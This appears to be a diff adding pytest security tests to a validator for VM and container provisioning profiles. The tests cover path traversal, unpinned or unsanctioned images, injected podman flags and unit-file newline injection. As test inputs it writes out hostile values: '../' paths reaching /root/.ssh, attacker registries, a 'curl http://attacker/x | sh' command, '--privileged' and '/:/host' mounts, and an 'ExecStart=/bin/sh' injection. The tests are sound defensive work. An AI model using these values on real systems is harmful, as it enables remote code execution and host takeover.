@@ -242,3 +242,199 @@ def test_a_release_package_repository_needs_no_separate_gpg_key():
     make the only sanctioned no-internet repository unusable."""
     assert profile_rules.repo_problems(
         {"release_package": "oracle-epel-release-el9"}) == []
+
+
+# --- path traversal, in the MIDDLE of a path (found 2026-08-24) ---------------
+#
+# A LIVE BUG IN SHIPPED CODE, not a hardening exercise. `DEST` is where root
+# unpacks a downloaded tarball and then runs `chown -R`. Its per-segment
+# lookahead was anchored to end-of-string, so it refused a TRAILING `..` and
+# nothing else:
+#
+#     /opt/../..                  refused    <- the only form ever tested
+#     /opt/a/../../../root/.ssh   ACCEPTED
+#
+# The adversarial review of 2026-08-22 tested the trailing form, saw it refused,
+# and the comment above DEST then claimed `..` was impossible by construction.
+# It was not. Found while writing the equivalent rule for container data
+# directories — by testing the middle of the path instead of the end.
+#
+# Every one of these must stay refused, and the two confined paths share one
+# segment rule so they cannot drift apart again.
+
+TRAVERSALS = [
+    "/opt/..", "/opt/.", "/opt/../..", "/opt/../../etc",
+    "/opt/a/../../../root/.ssh", "/opt/./../etc", "/opt/a/./b", "/opt/a/../b",
+]
+
+
+@pytest.mark.parametrize("path", TRAVERSALS)
+def test_no_dot_segment_survives_anywhere_in_a_destination(path):
+    assert not profile_rules.DEST.match(path), (
+        f"{path} would be unpacked into by root")
+
+
+@pytest.mark.parametrize("path", [p.replace("/opt", "/var/lib") for p in TRAVERSALS])
+def test_no_dot_segment_survives_in_a_data_directory(path):
+    assert not profile_rules.DATA_DIR.match(path), (
+        f"{path} would be bind-mounted into a container by root")
+
+
+@pytest.mark.parametrize("path", ["/opt/thing", "/opt/keycloak/data",
+                                  "/opt/a.b-c", "/opt/x/y/z"])
+def test_ordinary_destinations_are_untouched(path):
+    """The fix must not overshoot: a dot INSIDE a segment is ordinary."""
+    assert profile_rules.DEST.match(path)
+
+
+@pytest.mark.parametrize("path", ["/var/lib/rabbitmq", "/var/lib/pgsql/data"])
+def test_ordinary_data_directories_are_accepted(path):
+    assert profile_rules.DATA_DIR.match(path)
+
+
+@pytest.mark.parametrize("ref", ["a/../b", "..", ".", "./x", "a/./b"])
+def test_an_image_path_cannot_climb_either(ref):
+    assert not profile_rules.IMAGE_PATH.match(ref)
+
+
+def test_the_archive_linter_actually_refuses_a_traversing_destination():
+    """Not a duplicate of the pattern tests: this asserts the LINTER calls them.
+    It once had its own prefix-checking copy that let everything through."""
+    profile = {
+        "code": "thing", "builds_on": "oci/service-vm", "ports": [1234],
+        "expects": "3", "version_command": "/opt/thing/bin/thing --version",
+        "archive": {"url": "https://example.com/t.tar.gz", "sha256": "a" * 64,
+                    "dest": "/opt/a/../../../root/.ssh", "user": "thing",
+                    "unit": {"exec_start": "/opt/thing/bin/thing run"}},
+        "rhel": {"packages": [], "services": ["thing"]},
+    }
+    assert profile_rules.profile_problems(profile), (
+        "a profile unpacking a tarball into /root/.ssh was accepted")
+
+
+# --- containers (C8) ----------------------------------------------------------
+#
+# Pulling an image is executing whatever its publisher put in it, as whatever
+# user the image declares. That is closer to an archive than to a package — one
+# specific artifact, fetched and run — so it gets an archive's discipline.
+#
+# THE FIELD ALLOW-LIST IS THE LOAD-BEARING PART. A profile declares data; the
+# renderer builds the podman command. If a profile could contribute to that
+# command line, `--privileged` or `-v /:/host` ends the discussion and no care
+# over the image name matters.
+
+def container(**over):
+    base = {"image": "docker.io/library/rabbitmq", "tag": "4.1-management",
+            "digest": "sha256:" + "a" * 64,
+            "data_dir": "/var/lib/rabbitmq", "data_mount": "/var/lib/rabbitmq"}
+    base.update(over)
+    return base
+
+
+def test_a_pinned_image_from_a_known_registry_is_accepted():
+    assert profile_rules.container_problems(container()) == []
+
+
+def test_the_digest_is_not_optional():
+    """A tag can be repointed by its publisher AFTER this recipe was proved, so
+    what the proof certified and what a later request installs would be
+    different things wearing the same name."""
+    assert profile_rules.container_problems(container(digest=None))
+    no_digest = {k: v for k, v in container().items() if k != "digest"}
+    assert profile_rules.container_problems(no_digest)
+
+
+@pytest.mark.parametrize("digest", [
+    "sha256:" + "A" * 64, "sha256:" + "a" * 63, "sha256:zz", "a" * 64,
+    "md5:" + "a" * 32, "sha256:", 12345,
+])
+def test_a_digest_that_is_not_a_sha256_is_refused(digest):
+    assert profile_rules.container_problems(container(digest=digest))
+
+
+@pytest.mark.parametrize("image", [
+    "evil.example.com/x/y",          # a registry nobody sanctioned
+    "docker.io.attacker.net/x/y",    # a near-miss on a sanctioned name
+    # THE SUFFIX TRAP. Every hostile case above happens not to end in `.io`, so
+    # replacing the closed set with `registry.endswith(".io")` passed the whole
+    # file — the same hole a plant found in RELEASE_PACKAGES the day before,
+    # where "any name ending in -release" also passed. A pattern is not a list.
+    "attacker.io/evil/image",
+    "quay.io.attacker.io/x/y",
+    "registry.io/x/y",
+    "rabbitmq",                      # unqualified: the machine's search decides
+    "docker.io/a/../b",              # climbing out of the repository path
+    "", None, 42,
+])
+def test_an_image_from_anywhere_else_is_refused(image):
+    assert profile_rules.container_problems(container(image=image))
+
+
+@pytest.mark.parametrize("field,value", [
+    ("privileged", True),
+    ("volumes", ["/:/host"]),
+    ("network", "host"),
+    ("command", "sh -c 'curl http://attacker/x | sh'"),
+    ("user", "root"),
+    ("cap_add", ["SYS_ADMIN"]),
+    ("podman_args", "--privileged"),
+])
+def test_a_profile_may_never_contribute_a_flag(field, value):
+    """THE rule this rung stands on. Refused rather than ignored: ignoring an
+    unvalidated key is how it comes to be rendered later by someone who assumed
+    it had been checked."""
+    problems = profile_rules.container_problems(container(**{field: value}))
+    assert problems, f"{field}={value!r} was accepted onto a podman command line"
+
+
+@pytest.mark.parametrize("path", [
+    "/var/lib/../../etc", "/var/lib/a/../../root/.ssh", "/etc", "/", "/opt/x",
+    "relative/path", "/var/lib/x:/host",
+])
+def test_the_host_side_of_the_mount_stays_confined(path):
+    assert profile_rules.container_problems(container(data_dir=path))
+
+
+@pytest.mark.parametrize("path", ["/data:/host", "/a/../b", "not-absolute", ""])
+def test_the_container_side_cannot_inject_another_mount(path):
+    assert profile_rules.container_problems(container(data_mount=path))
+
+
+def test_a_mount_needs_both_halves():
+    """One without the other mounts nothing, or mounts it nowhere — and a
+    container that silently stores its data inside itself loses it on the first
+    restart, which looks like a working service until it isn't."""
+    assert profile_rules.container_problems(
+        {k: v for k, v in container().items() if k != "data_mount"})
+    assert profile_rules.container_problems(
+        {k: v for k, v in container().items() if k != "data_dir"})
+
+
+def test_an_environment_value_cannot_break_out_of_the_unit_file():
+    assert profile_rules.container_problems(
+        container(environment={"X": "a\nExecStart=/bin/sh"}))
+    assert profile_rules.container_problems(
+        container(environment={"lower": "x"}))
+    assert profile_rules.container_problems(container(environment="X=1"))
+
+
+def test_a_container_counts_as_installing_something():
+    """The installs-nothing rule predates containers and asks about packages and
+    archives. A container profile legitimately declares neither."""
+    profile = {"code": "rabbitmq", "builds_on": "oci/service-vm",
+               "ports": [5672], "version_command": "podman exec rabbitmq true",
+               "container": container(),
+               "rhel": {"packages": [], "services": ["rabbitmq"]}}
+    assert profile_rules.profile_problems(profile) == [], (
+        profile_rules.profile_problems(profile))
+
+
+def test_the_profile_linter_actually_calls_the_container_rules():
+    """Not a duplicate: this asserts the gate is wired. The API's archive linter
+    once had its own prefix-checking copy, and a weaponised profile passed it
+    with zero findings."""
+    profile = {"code": "rabbitmq", "builds_on": "oci/service-vm", "ports": [5672],
+               "version_command": "podman exec rabbitmq true",
+               "container": container(image="evil.example.com/x/y"),
+               "rhel": {"packages": [], "services": ["rabbitmq"]}}
+    assert profile_rules.profile_problems(profile)
